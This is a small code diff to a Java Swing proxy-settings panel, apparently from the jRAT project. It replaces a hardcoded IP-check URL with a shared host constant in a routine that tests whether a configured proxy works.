@@ -22,6 +22,7 @@ import javax.swing.JPanel;
 import javax.swing.JTextField;
 import javax.swing.LayoutStyle.ComponentPlacement;
 
+import com.redpois0n.Constants;
 import com.redpois0n.settings.Settings;
 import com.redpois0n.ui.components.JPortSpinner;
 
@@ -77,7 +78,7 @@ public class PanelSettingsProxy extends JPanel {
 			public void actionPerformed(ActionEvent arg0) {
 				try {	
 					Proxy proxy = new Proxy(useSocks() ? Proxy.Type.SOCKS : Proxy.Type.HTTP, new InetSocketAddress(getHost(), getPort()));
-					URLConnection connection = new URL("http://jrat-project.org/misc/getip.php").openConnection(proxy);
+					URLConnection connection = new URL(Constants.HOST + "/misc/getip.php").openConnection(proxy);
 						
 					String ip = new BufferedReader(new InputStreamReader(connection.getInputStream())).readLine();	
 
